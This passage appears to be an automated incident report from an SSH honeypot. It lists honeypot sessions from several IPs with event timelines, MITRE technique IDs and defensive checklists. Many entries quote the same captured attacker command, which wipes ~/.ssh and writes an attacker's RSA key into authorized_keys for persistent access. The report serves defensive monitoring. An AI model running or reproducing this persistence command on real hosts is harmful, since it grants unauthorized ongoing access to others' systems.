| `2026-06-14 07:12:39` | `cowrie.client.version` |
| `2026-06-14 07:12:39` | `cowrie.client.kex` |
| `2026-06-14 07:12:40` | `cowrie.login.success` |
| `2026-06-14 07:12:41` | `cowrie.session.params` |
| `2026-06-14 07:12:41` | `cowrie.command.input` |
| `2026-06-14 07:12:41` | `cowrie.command.failed` |
| `2026-06-14 07:12:42` | `cowrie.log.closed` |
| `2026-06-14 07:12:42` | `cowrie.session.params` |
| `2026-06-14 07:12:42` | `cowrie.command.input` |
| `2026-06-14 07:12:42` | `cowrie.session.file_download` |
| `2026-06-14 07:12:42` | `cowrie.log.closed` |
| `2026-06-14 07:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a558a9327df

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:12 |
| **Last Seen** | 2026-06-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:12:45` | `cowrie.session.connect` |
| `2026-06-14 07:12:45` | `cowrie.client.version` |
| `2026-06-14 07:12:45` | `cowrie.client.kex` |
| `2026-06-14 07:12:46` | `cowrie.login.success` |
| `2026-06-14 07:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed58b6c4b83

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:14 |
| **Last Seen** | 2026-06-14 07:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:14:29` | `cowrie.session.connect` |
| `2026-06-14 07:14:29` | `cowrie.client.version` |
| `2026-06-14 07:14:29` | `cowrie.client.kex` |
| `2026-06-14 07:14:30` | `cowrie.login.success` |
| `2026-06-14 07:14:31` | `cowrie.session.params` |
| `2026-06-14 07:14:31` | `cowrie.command.input` |
| `2026-06-14 07:14:31` | `cowrie.command.failed` |
| `2026-06-14 07:14:31` | `cowrie.log.closed` |
| `2026-06-14 07:14:32` | `cowrie.session.params` |
| `2026-06-14 07:14:32` | `cowrie.command.input` |
| `2026-06-14 07:14:32` | `cowrie.session.file_download` |
| `2026-06-14 07:14:32` | `cowrie.log.closed` |
| `2026-06-14 07:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f025e9ff512

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:14 |
| **Last Seen** | 2026-06-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:14:35` | `cowrie.session.connect` |
| `2026-06-14 07:14:35` | `cowrie.client.version` |
| `2026-06-14 07:14:35` | `cowrie.client.kex` |
| `2026-06-14 07:14:36` | `cowrie.login.success` |
| `2026-06-14 07:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65ce8368ab6

| Field | Detail |
|---|---|
| **Source IP** | `39.106.230[.]113` |
| **First Seen** | 2026-06-14 07:16 |
| **Last Seen** | 2026-06-14 07:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:16:09` | `cowrie.session.connect` |
| `2026-06-14 07:16:09` | `cowrie.client.version` |
| `2026-06-14 07:16:09` | `cowrie.client.kex` |
| `2026-06-14 07:16:10` | `cowrie.login.success` |
| `2026-06-14 07:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.106.230[.]113` to AbuseIPDB if not already reported
- [ ] Block `39.106.230[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24aebf3be8a9

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:21 |
| **Last Seen** | 2026-06-14 07:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:21:36` | `cowrie.session.connect` |
| `2026-06-14 07:21:36` | `cowrie.client.version` |
| `2026-06-14 07:21:37` | `cowrie.client.kex` |
| `2026-06-14 07:21:38` | `cowrie.login.success` |
| `2026-06-14 07:21:38` | `cowrie.session.params` |
| `2026-06-14 07:21:38` | `cowrie.command.input` |
| `2026-06-14 07:21:38` | `cowrie.command.failed` |
| `2026-06-14 07:21:39` | `cowrie.log.closed` |
| `2026-06-14 07:21:39` | `cowrie.session.params` |
| `2026-06-14 07:21:39` | `cowrie.command.input` |
| `2026-06-14 07:21:39` | `cowrie.session.file_download` |
| `2026-06-14 07:21:39` | `cowrie.log.closed` |
| `2026-06-14 07:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009d983bb70b

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:21 |
| **Last Seen** | 2026-06-14 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:21:42` | `cowrie.session.connect` |
| `2026-06-14 07:21:42` | `cowrie.client.version` |
| `2026-06-14 07:21:43` | `cowrie.client.kex` |
| `2026-06-14 07:21:44` | `cowrie.login.success` |
| `2026-06-14 07:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45aef42429a0

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]165` |
| **First Seen** | 2026-06-14 07:53 |
| **Last Seen** | 2026-06-14 07:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:53:12` | `cowrie.session.connect` |
| `2026-06-14 07:53:12` | `cowrie.client.version` |
| `2026-06-14 07:53:12` | `cowrie.client.kex` |
| `2026-06-14 07:53:13` | `cowrie.login.success` |
| `2026-06-14 07:53:13` | `cowrie.session.params` |
| `2026-06-14 07:53:13` | `cowrie.command.input` |
| `2026-06-14 07:53:13` | `cowrie.command.failed` |
| `2026-06-14 07:53:13` | `cowrie.log.closed` |
| `2026-06-14 07:53:13` | `cowrie.session.params` |
| `2026-06-14 07:53:13` | `cowrie.command.input` |
| `2026-06-14 07:53:13` | `cowrie.session.file_download` |
| `2026-06-14 07:53:13` | `cowrie.log.closed` |
| `2026-06-14 07:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]165` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-767cc27a3fc9

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]165` |
| **First Seen** | 2026-06-14 07:53 |
| **Last Seen** | 2026-06-14 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:53:15` | `cowrie.session.connect` |
| `2026-06-14 07:53:15` | `cowrie.client.version` |
| `2026-06-14 07:53:15` | `cowrie.client.kex` |
| `2026-06-14 07:53:15` | `cowrie.login.success` |
| `2026-06-14 07:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]165` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c693382f1e6c

| Field | Detail |
|---|---|
| **Source IP** | `115.190.161[.]6` |
| **First Seen** | 2026-06-14 08:33 |
| **Last Seen** | 2026-06-14 08:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 08:33:34` | `cowrie.session.connect` |
| `2026-06-14 08:33:34` | `cowrie.client.version` |
| `2026-06-14 08:33:34` | `cowrie.client.kex` |
| `2026-06-14 08:33:35` | `cowrie.login.success` |
| `2026-06-14 08:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.161[.]6` to AbuseIPDB if not already reported
- [ ] Block `115.190.161[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f4fcc5b1fae

| Field | Detail |
|---|---|
| **Source IP** | `185.42.21[.]94` |
| **First Seen** | 2026-06-14 08:38 |
| **Last Seen** | 2026-06-14 08:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 08:38:00` | `cowrie.session.connect` |
| `2026-06-14 08:38:00` | `cowrie.client.version` |
| `2026-06-14 08:38:01` | `cowrie.client.kex` |
| `2026-06-14 08:38:02` | `cowrie.login.success` |
| `2026-06-14 08:38:02` | `cowrie.session.params` |
| `2026-06-14 08:38:02` | `cowrie.command.input` |
| `2026-06-14 08:38:02` | `cowrie.command.failed` |
| `2026-06-14 08:38:03` | `cowrie.log.closed` |
| `2026-06-14 08:38:03` | `cowrie.session.params` |
| `2026-06-14 08:38:03` | `cowrie.command.input` |
| `2026-06-14 08:38:04` | `cowrie.session.file_download` |
| `2026-06-14 08:38:04` | `cowrie.log.closed` |
| `2026-06-14 08:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.42.21[.]94` to AbuseIPDB if not already reported
- [ ] Block `185.42.21[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc06cf0e79f

| Field | Detail |
|---|---|
| **Source IP** | `185.42.21[.]94` |
| **First Seen** | 2026-06-14 08:38 |
| **Last Seen** | 2026-06-14 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 08:38:07` | `cowrie.session.connect` |
| `2026-06-14 08:38:07` | `cowrie.client.version` |
| `2026-06-14 08:38:07` | `cowrie.client.kex` |
| `2026-06-14 08:38:08` | `cowrie.login.success` |
| `2026-06-14 08:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.42.21[.]94` to AbuseIPDB if not already reported
- [ ] Block `185.42.21[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-809142a05c2d

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 08:47 |
| **Last Seen** | 2026-06-14 08:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 08:47:30` | `cowrie.session.connect` |
| `2026-06-14 08:47:30` | `cowrie.client.version` |
| `2026-06-14 08:47:31` | `cowrie.client.kex` |
| `2026-06-14 08:47:31` | `cowrie.login.success` |
| `2026-06-14 08:47:32` | `cowrie.session.params` |
| `2026-06-14 08:47:32` | `cowrie.command.input` |
| `2026-06-14 08:47:32` | `cowrie.command.failed` |
| `2026-06-14 08:47:32` | `cowrie.log.closed` |
| `2026-06-14 08:47:32` | `cowrie.session.params` |
| `2026-06-14 08:47:32` | `cowrie.command.input` |
| `2026-06-14 08:47:33` | `cowrie.session.file_download` |
| `2026-06-14 08:47:33` | `cowrie.log.closed` |
| `2026-06-14 08:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a715468102c5

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 08:47 |
| **Last Seen** | 2026-06-14 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 08:47:35` | `cowrie.session.connect` |
| `2026-06-14 08:47:35` | `cowrie.client.version` |
| `2026-06-14 08:47:35` | `cowrie.client.kex` |
| `2026-06-14 08:47:36` | `cowrie.login.success` |
| `2026-06-14 08:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75bd482d720f

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 08:54 |
| **Last Seen** | 2026-06-14 08:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 08:54:04` | `cowrie.session.connect` |
| `2026-06-14 08:54:04` | `cowrie.client.version` |
| `2026-06-14 08:54:04` | `cowrie.client.kex` |
| `2026-06-14 08:54:05` | `cowrie.login.success` |
| `2026-06-14 08:54:05` | `cowrie.session.params` |
| `2026-06-14 08:54:05` | `cowrie.command.input` |
| `2026-06-14 08:54:05` | `cowrie.command.failed` |
| `2026-06-14 08:54:06` | `cowrie.log.closed` |
| `2026-06-14 08:54:06` | `cowrie.session.params` |
| `2026-06-14 08:54:06` | `cowrie.command.input` |
| `2026-06-14 08:54:06` | `cowrie.session.file_download` |
| `2026-06-14 08:54:06` | `cowrie.log.closed` |
| `2026-06-14 08:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99dd9718f14a

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 08:54 |
| **Last Seen** | 2026-06-14 08:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 08:54:09` | `cowrie.session.connect` |
| `2026-06-14 08:54:09` | `cowrie.client.version` |
| `2026-06-14 08:54:09` | `cowrie.client.kex` |
| `2026-06-14 08:54:09` | `cowrie.login.success` |
| `2026-06-14 08:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd09b57c16e

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:02 |
| **Last Seen** | 2026-06-14 09:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:02:40` | `cowrie.session.connect` |
| `2026-06-14 09:02:40` | `cowrie.client.version` |
| `2026-06-14 09:02:40` | `cowrie.client.kex` |
| `2026-06-14 09:02:41` | `cowrie.login.success` |
| `2026-06-14 09:02:41` | `cowrie.session.params` |
| `2026-06-14 09:02:41` | `cowrie.command.input` |
| `2026-06-14 09:02:41` | `cowrie.command.failed` |
| `2026-06-14 09:02:42` | `cowrie.log.closed` |
| `2026-06-14 09:02:42` | `cowrie.session.params` |
| `2026-06-14 09:02:42` | `cowrie.command.input` |
| `2026-06-14 09:02:42` | `cowrie.session.file_download` |
| `2026-06-14 09:02:42` | `cowrie.log.closed` |
| `2026-06-14 09:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1b1218d5bc

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:02 |
| **Last Seen** | 2026-06-14 09:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:02:45` | `cowrie.session.connect` |
| `2026-06-14 09:02:45` | `cowrie.client.version` |
| `2026-06-14 09:02:45` | `cowrie.client.kex` |
| `2026-06-14 09:02:46` | `cowrie.login.success` |
| `2026-06-14 09:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a855c1f5b637

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:05 |
| **Last Seen** | 2026-06-14 09:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
